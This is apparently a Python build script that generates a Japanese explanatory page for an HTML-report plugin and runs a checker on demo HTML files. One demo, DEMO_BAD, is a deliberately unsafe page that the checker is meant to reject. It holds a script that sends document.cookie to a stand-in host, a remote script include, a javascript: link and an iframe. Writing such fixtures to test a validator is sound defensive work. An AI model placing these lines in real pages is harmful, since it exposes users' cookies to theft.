"""html-report の create の動作解説ページ（docs/explain-create/page.html）を作る。

使い方: python docs/explain-create/build.py [出力先のフォルダ]
出力先を省くと、一時フォルダの html-report-explain-create/ に、次を書く。
  index.html    公開用（Artifact に渡す。DOCTYPE・head・body を含まない）
  preview.html  ローカルで開いて確かめる用（index.html を完全な HTML で包んだもの）
  images/       解説に使う画像（docs/images/ から写す）

page.html の {{名前}} は、生成のたびに次で埋める。
  - 実ファイル: 手順書・dom-check.js・NOTICE の全文と、手順の節。大きさ。版。
  - 実行結果: デモの HTML に tests/check_html.py を実行した標準出力と終了コード。
  - 数と行: 手順書の数、手順 9 の照合の項目数、手順の見出しの行番号。
ブラウザで採取した戻り値と画面の画像は、page.html と docs/images/ に固定してある
（撮影時の版は SHOT_VERSION）。リポジトリの中には出力しない。
"""

import html
import importlib.util
import platform
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
REPO = HERE.parent.parent
PLUGIN = REPO / "plugins" / "html-report"
CREATE = PLUGIN / "skills" / "create"

# docs/images/explain-create-sample.png を撮った時点の版と日付。画像を撮り直したら更新する。
SHOT_VERSION = "0.1.3"
SHOT_DATE = "2026-11-25"
SHOT_IMAGE = "explain-create-sample.png"

FILES = {
    "SKILL.md": CREATE / "SKILL.md",
    "materials.md": CREATE / "references" / "materials.md",
    "generate.md": CREATE / "references" / "generate.md",
    "verify.md": CREATE / "references" / "verify.md",
    "select.md": CREATE / "references" / "select.md",
    "dom-check.js": CREATE / "dom-check.js",
}
REFERENCES = [name for name in FILES if name.endswith(".md") and name != "SKILL.md"]
STEP = re.compile(r"^### 手順(\d+): (.+?)\n(.*?)(?=^#{1,3} |\Z)", re.M | re.S)
TOKEN = re.compile(r"\{\{([a-z_]+)(?::([^}]*))?\}\}")

# 標準出力を採取するデモ。見た目の確認は不要なので、最小の HTML にする。
DEMO_GOOD_NAME = "2026-11-25-デモ.html"
DEMO_GOOD = """<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; font-src data:; style-src 'unsafe-inline'; script-src 'unsafe-inline'; form-action 'none'; base-uri 'none'">
<title>デモレポート</title>
</head>
<body>
<nav><a href="#sales">売上の推移</a></nav>
<h1>月次売上レポート</h1>
<section id="sales"><h2>売上の推移</h2>
<p>10 月の売上は 173.5 万円（58 件）。</p>
<p>備考: &lt;script&gt;alert(1)&lt;/script&gt;</p>
</section>
</body>
</html>
"""
DEMO_BAD_NAME = "bad.html"
DEMO_BAD = """<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta http-equiv="refresh" content="0;url=https://x.example/">
<title>悪いデモ</title>
<script src="https://x.example/y.js"></script>
</head>
<body onload="init()">
<a href="javascript:alert(1)">リンク</a>
<iframe src="https://x.example/"></iframe>
<script>fetch("https://x.example/?" + document.cookie)</script>
</body>
</html>
"""
SAMPLE_NAME = "2026-11-25-月次売上レポート.html"
SAMPLE_REQUIRED = ["売上の推移", "件数の推移", "最高", "最低", "出典"]
CHECK_COMMAND = (
    r"<リポジトリ>\.venv\Scripts\python -I -X utf8 <リポジトリ>\tests\check_html.py "
)
CASES = [
    ("正常（必須の語あり）", [DEMO_GOOD_NAME, "--require", "売上の推移"]),
    (
        "止まる例 1: 必須の語が本文にない",
        [DEMO_GOOD_NAME, "--require", "売上の推移", "件数の推移"],
    ),
    ("止まる例 2: 危険な書き方が混ざった HTML", [DEMO_BAD_NAME]),
    ("止まる例 3: パスを渡さない", []),
]

TAGS = {
    "k": "解説",
    "r": "読む",
    "w": "書く",
    "o": "標準出力",
    "v": "戻り値",
}


def read(path: Path) -> str:
    return path.read_text(encoding="utf-8")


def esc(text: str) -> str:
    return html.escape(text, quote=True)


def block(
    kind: str,
    title: str,
    text: str,
    *,
    wrap: bool = True,
    prose: bool = False,
) -> str:
    """実ファイルの文章や実行結果を、ラベル付きの枠に入れる（本文は変えない）。"""
    cls = ("wrap" if wrap else "nowrap") + (" prose" if prose else "")
    return (
        f'<div class="blk b-{kind}"><div class="blk-h">'
        f'<span class="tag t-{kind}">{TAGS[kind]}</span><span class="blk-t">{title}</span></div>'
        f'<pre class="{cls}"><code>{esc(text)}</code></pre></div>'
    )


# ---------- 実ファイルから読む ----------
def steps(name: str) -> dict[int, str]:
    """手順の見出しと本文を、番号ごとに返す（実ファイルの節そのまま）。"""
    return {
        int(n): f"### 手順{n}: {title}\n{body}".rstrip()
        for n, title, body in STEP.findall(read(FILES[name]))
    }


def step_names() -> dict[int, str]:
    text = read(FILES["SKILL.md"]).split("\n## 手順\n")[1]
    return {int(n): title for n, title, _ in STEP.findall(text)}


def step_line(name: str, number: int) -> int | None:
    """見出し「### 手順N: 」がある行番号（1 から数える）。ない手順書は None。"""
    for i, line in enumerate(read(FILES[name]).splitlines(), start=1):
        if line.startswith(f"### 手順{number}: "):
            return i
    return None


def head_chars() -> int:
    """SKILL.md の先頭（「## 手順」より前）の文字数。常に会話に入る部分。"""
    text = re.sub(
        r"\A---\r?\n.*?\r?\n---\r?\n", "", read(FILES["SKILL.md"]), flags=re.S
    )
    return len(text.split("\n## 手順\n")[0])


def check_points() -> int:
    """verify.md の手順 9 が照合する項目の数（「合わない点を直すとき」の前の箇条書き）。"""
    text = steps("verify.md")[9].split("#### 合わない点を直すとき")[0]
    return len(re.findall(r"^- ", text, re.M))


def version() -> str:
    found = re.search(
        r'"version":\s*"([^"]+)"', read(PLUGIN / ".claude-plugin" / "plugin.json")
    )
    if not found:
        raise SystemExit("plugin.json に version がない")
    return found.group(1)


# ---------- デモを実行して採取する ----------
class Demo:
    """一時フォルダにデモの HTML を書き、tests/check_html.py を実行する。"""

    def __init__(self, work: Path) -> None:
        self.work = work
        (work / DEMO_GOOD_NAME).write_text(DEMO_GOOD, encoding="utf-8")
        (work / DEMO_BAD_NAME).write_text(DEMO_BAD, encoding="utf-8")
        sample_module = _load("sample_report", HERE / "sample_report.py")
        page, self.facts = sample_module.build_report(
            REPO / "tests" / "fixtures" / "sales.csv"
        )
        (work / SAMPLE_NAME).write_text(page, encoding="utf-8")

    def run(self, args: list[str]) -> tuple[str, int]:
        done = subprocess.run(  # noqa: S603
            [
                sys.executable,
                "-I",
                "-X",
                "utf8",
                str(REPO / "tests" / "check_html.py"),
                *args,
            ],
            cwd=self.work,
            capture_output=True,
            encoding="utf-8",
            check=False,
        )
        return self.scrub(done.stdout.rstrip("\n")), done.returncode

    def scrub(self, text: str) -> str:
        """採取した出力のパスを、読みやすい印に置き換える。"""
        for path, mark in ((self.work, "<D>"), (REPO, "<リポジトリ>")):
            text = text.replace(str(path), mark).replace(path.as_posix(), mark)
        return text


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def tool_version(command: list[str]) -> str:
    exe = shutil.which(command[0])
    if exe is None:
        return "（未取得: コマンドがない）"
    try:
        done = subprocess.run(  # noqa: S603
            [exe, *command[1:]],
            capture_output=True,
            encoding="utf-8",
            check=False,
            timeout=30,
        )
    except (OSError, subprocess.TimeoutExpired):
        return "（未取得: 実行できない）"
    return (
        (done.stdout or done.stderr).strip().splitlines()[0]
        if done.returncode == 0
        else "（未取得）"
    )


# ---------- トークンの埋め込み ----------
class Resolver:
    def __init__(self, demo: Demo) -> None:
        self.demo = demo
        self.names = step_names()

    def __call__(self, found: re.Match) -> str:
        name, arg = found.group(1), found.group(2) or ""
        handler = getattr(self, f"t_{name}", None)
        if handler is None:
            raise SystemExit(f"page.html に、未対応のトークン {{{{{name}}}}} がある")
        return handler(*arg.split(":")) if arg else handler()

    def t_size(self, name: str) -> str:
        path = FILES[name]
        return f"{path.stat().st_size:,} B／{len(read(path)):,} 字"

    def t_head_chars(self) -> str:
        return f"{head_chars():,}"

    def t_version(self) -> str:
        return version()

    def t_md_count(self) -> str:
        return str(1 + len(REFERENCES))

    def t_ref_count(self) -> str:
        return str(len(REFERENCES))

    def t_check_points(self) -> str:
        return str(check_points())

    def t_sample_facts(self) -> str:
        return esc(self.demo.facts)

    def t_step_name(self, number: str) -> str:
        return esc(self.names[int(number)])

    def t_step_lines(self, number: str) -> str:
        parts = []
        for name in ("SKILL.md", *REFERENCES):
            line = step_line(name, int(number))
            if line is not None:
                parts.append(f"{name} {line} 行目")
        return "実ファイルの見出し: " + "・".join(parts)

    def t_file_step(self, name: str, number: str) -> str:
        title = f"{name} の手順{number}（実ファイルの節をそのまま）"
        return block("r", title, steps(name)[int(number)], prose=True)

    def t_file_full_block(self, name: str) -> str:
        if name == "dom-check.js":
            return block(
                "r", "dom-check.js（全文。行番号なし）", read(FILES[name]), wrap=False
            )
        return block("r", f"{name}（全文）", read(FILES[name]), prose=True)

    def t_notice(self) -> str:
        return block(
            "r",
            "plugins/html-report/NOTICE（全文）",
            read(PLUGIN / "NOTICE"),
            prose=True,
        )

    def t_check_run(self, index: str) -> str:
        label, args = CASES[int(index)]
        out, code = self.demo.run(args)
        text = f"$ {CHECK_COMMAND}{' '.join(args)}\n{out}\n[終了コード {code}]"
        return block("o", f"{label}（終了コード {code}）", text, wrap=False)

    def t_sample_check(self) -> str:
        args = [SAMPLE_NAME, "--require", *SAMPLE_REQUIRED]
        out, code = self.demo.run(args)
        text = f"$ {CHECK_COMMAND}{' '.join(args)}\n{out}\n[終了コード {code}]"
        return block("o", "この HTML に check_html.py を実行した結果", text, wrap=False)

    def t_env_versions(self) -> str:
        text = "\n".join(
            [
                "$ node -v",
                tool_version(["node", "-v"]),
                "$ python --version",
                f"Python {platform.python_version()}",
                "$ claude --version",
                tool_version(["claude", "--version"]),
            ]
        )
        return block("o", "実行したコマンドと出力", text, wrap=False)

    def t_shot_note(self) -> str:
        now = version()
        note = f"撮影時の版 v{SHOT_VERSION}（撮影日 {SHOT_DATE}）。"
        if now == SHOT_VERSION:
            return note + "現在の版と同じ。"
        return (
            note
            + f"現在の版は v{now}。画面が変わっていないか確かめ、必要なら撮り直す。"
        )


def render(out_dir: Path, work: Path) -> None:
    resolver = Resolver(Demo(work))
    page = TOKEN.sub(resolver, read(HERE / "page.html"))
    if TOKEN.search(page):
        raise SystemExit("埋め込めなかったトークンが残っている")
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "index.html").write_text(page, encoding="utf-8")
    preview = (
        '<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8">'
        '<meta name="viewport" content="width=device-width,initial-scale=1"></head>'
        f"<body>{page}</body></html>"
    )
    (out_dir / "preview.html").write_text(preview, encoding="utf-8")
    shutil.copytree(REPO / "docs" / "images", out_dir / "images", dirs_exist_ok=True)


def main(argv: list[str]) -> int:
    if len(argv) > 2:
        print("使い方: python docs/explain-create/build.py [出力先のフォルダ]")
        return 2
    if len(argv) == 2:
        out_dir = Path(argv[1]).resolve()
    else:
        out_dir = Path(tempfile.gettempdir()) / "html-report-explain-create"
    if out_dir == REPO or REPO in out_dir.parents:
        print("出力先は、リポジトリの外にする:", out_dir)
        return 2
    with tempfile.TemporaryDirectory() as work:
        render(out_dir, Path(work))
    print(out_dir / "index.html")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
